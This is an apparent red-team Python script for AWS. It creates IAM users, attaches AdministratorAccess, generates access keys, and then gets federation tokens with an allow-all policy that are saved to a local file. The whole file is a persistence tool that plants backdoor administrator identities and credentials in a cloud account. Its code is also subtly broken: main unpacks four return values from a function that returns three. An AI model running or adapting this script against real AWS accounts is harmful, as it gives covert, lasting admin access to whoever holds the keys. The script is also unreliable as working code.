from datetime import datetime
import json
import boto3
import time
import botocore.exceptions

def json_serial(obj):
    """JSON serializer for objects not serializable by default json code"""
    if isinstance(obj, datetime):
        return obj.isoformat()
    raise TypeError("Type not serializable")

def get_federation_token_with_wait(sts_client, user_name, duration_seconds=3600):
    # 定義一個更廣泛的政策
    admin_policy = {
        "Version": "2012-10-17",
        "Statement": [
            {
                "Effect": "Allow",
                "Action": "*",  # 允許所有操作
                "Resource": "*"  # 允許訪問所有資源
            }
        ]
    }

    try:
        federation_token = sts_client.get_federation_token(
            Name=user_name,
            DurationSeconds=duration_seconds,
            Policy=json.dumps(admin_policy)
        )
        return federation_token
    except botocore.exceptions.ClientError as error:
        print(f"Error getting federation token: {error}")
        return None
    
def create_user_with_retry(iam_client, user_name, max_attempts=6, delay=10):
    attempts = 0
    while attempts < max_attempts:
        try:
            iam_client.create_user(UserName=user_name)
            print(f"User {user_name} created successfully.")
            return True
        except botocore.exceptions.ClientError as error:
            if error.response['Error']['Code'] == 'EntityAlreadyExists':
                print(f"User {user_name} already exists.")
                return False
            else:
                print(f"Error creating user {user_name}: {error}")
                attempts += 1
                time.sleep(delay)
    print(f"Failed to create user {user_name} after {max_attempts} attempts.")
    return False

def create_account_and_keys(session):
    iam_client = session.client('iam')
    user_name = f"ft_nested_user_{int(time.time())}"
    if create_user_with_retry(iam_client, user_name):
        access_key_response = iam_client.create_access_key(UserName=user_name)
        iam_client.attach_user_policy(
            UserName=user_name,
            PolicyArn="arn:aws:iam::aws:policy/AdministratorAccess"
        )
        return user_name, access_key_response['AccessKey']['AccessKeyId'], access_key_response['AccessKey']['SecretAccessKey']
    return None, None, None

def test_access_key(access_key_id, secret_access_key,session_token):
    client = boto3.client(
        'ec2',
        region_name='us-east-1',
        aws_access_key_id=access_key_id,
        aws_secret_access_key=secret_access_key,
        aws_session_token=session_token
    )
    try:
        # 嘗試獲取IAM用戶列表，以測試AK/SK是否有效
        print("Testing access key")
        client.describe_instances()
        return True
    # except:
    #     return False
    except Exception as e:
            print(f'query_last_station_tdx: {e}')
            return False
    
def wait_for_key_activation(access_key_id, secret_access_key, session_token, max_attempts=6, delay=10):
    for _ in range(max_attempts):
        if test_access_key(access_key_id, secret_access_key,session_token):
            return True
        time.sleep(delay)  # 等待一段時間後重試
    return False

def main():
    session = boto3.Session(profile_name='harry-redteam')
    for i in range(3):
        print(f"Creating user {i+1}")
        user_name, new_ak, new_sk, session_token = create_account_and_keys(session)
        if user_name and new_ak and new_sk:
            print(f"Waiting for new keys to activate for user {user_name}")
            if wait_for_key_activation(new_ak, new_sk, None):
                print(f"Keys activated for user {user_name}")
                sts_client = boto3.client('sts', aws_access_key_id=new_ak, aws_secret_access_key=new_sk,aws_session_token=session_token)
                federation_token = get_federation_token_with_wait(sts_client, user_name)
                if federation_token:
                    print("Federation token obtained successfully.")
                    # 將聯盟令牌詳細信息寫入檔案
                    with open("federation_token.json", "w") as file:
                        json.dump(federation_token, file, indent=4, default=json_serial)

                    # 使用聯盟令牌的臨時存取金鑰和會話令牌更新 session
                    temp_credentials = federation_token['Credentials']
                    session = boto3.Session(
                        aws_access_key_id=temp_credentials['AccessKeyId'],
                        aws_secret_access_key=temp_credentials['SecretAccessKey'],
                        aws_session_token=temp_credentials['SessionToken']
                    )
                else:
                    print("Failed to obtain federation token.")
            else:
                print(f"Failed to activate keys for user {user_name}")
        else:
            print("Failed to create user or keys, stopping process")
            break

if __name__ == "__main__":
    main()
